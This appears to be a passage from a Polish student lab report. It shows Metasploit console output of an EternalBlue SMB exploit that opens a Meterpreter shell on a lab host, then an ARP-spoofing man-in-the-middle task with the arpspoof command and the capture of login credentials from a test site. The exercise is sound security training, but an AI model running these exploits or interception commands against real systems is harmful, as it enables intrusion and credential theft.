[-] Meterpreter session 19 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 19 closed.
[-] Meterpreter session 18 is not valid and will be closed
[-] Meterpreter session 20 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 20 closed.
[*] 192.168.0.103 - Meterpreter session 21 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 21 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 22 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 23 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 23 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 24 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 25 closed.  Reason: Died
[-] Meterpreter session 24 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 25 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 26 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 26 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 27 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 27 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 28 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 28 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 29 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 30 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 29 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 31 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 32 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 32 is not valid and will be closed
[-] Meterpreter session 30 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 31 is not valid and will be closed
[-] Meterpreter session 33 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 33 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 34 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 34 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 35 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 35 closed.
[*] 192.168.0.103 - Meterpreter session 36 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 36 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 37 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 37 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 38 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 38 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 39 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 39 closed.
[*] 192.168.0.103 - Meterpreter session 40 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 41 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 40 is not valid and will be closed
[-] Meterpreter session 41 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103:445 - Starting non-paged pool grooming
[*] 192.168.0.103 - Meterpreter session 42 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 43 closed.  Reason: Died
[+] 192.168.0.103:445 - Sending SMBv2 buffers
[+] 192.168.0.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.103:445 - Sending final SMBv2 buffers.
[*] 192.168.0.103:445 - Sending last fragment of exploit packet!
[*] 192.168.0.103:445 - Receiving response from exploit packet
[+] 192.168.0.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.103:445 - Sending egg to corrupted connection.
[*] 192.168.0.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 42 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 44 closed.  Reason: Died
[-] Meterpreter session 44 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 43 is not valid and will be closed
[-] Meterpreter session 46 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 46 closed.
[*] 192.168.0.103 - Meterpreter session 47 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 48 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 48 closed.
[*] 192.168.0.103 - Meterpreter session 49 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 49 is not valid and will be closed
[-] Meterpreter session 47 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 50 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 50 closed.
[*] 192.168.0.103 - Meterpreter session 50 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 51 closed.  Reason: Died
[-] Meterpreter session 51 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 52 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 52 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 53 closed.  Reason: Died
[-] Meterpreter session 53 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Meterpreter session 45 opened (192.168.0.147:4444 -> 192.168.0.103:49801) at 2022-11-06 08:51:36 -0500
[-] Meterpreter session 55 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 55 closed.
[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[-] Meterpreter session 54 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 54 closed.
meterpreter > pwd
C:\Windows\system32
```
# Zadanie 7 - MITM przez ARP poisoning
Atakujący:
1. Wykonaj atak MITM techniką ARP poisoning (ARP spoofing)1
Ofiara:
1. W przeglądarce nawiąż połączenie z http://testphp.vulnweb.com/login.php.
2. Wykonaj próbę logowania (dowolne dane).
Atakujący:
1. Odszukaj w zapisanym ruchu dane logowania ofiary.

W pierwszej kolejności ustalam adres ip mojej ofiary, a następnie uruchamiam ARPSPOOF w celu nasłuchiwania komunikacji:
```console
sudo arpspoof -i eth0 -t 192.168.0.103 192.168.0.1
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
```
Kolejne kroki to logowanie na podanej stronie internetowej:
![alt text](/screenshots/7_1.png)
Oraz wyszukanie użytych danych logowania tj użytkowanika i hasła:
![alt text](/screenshots/7_2.png)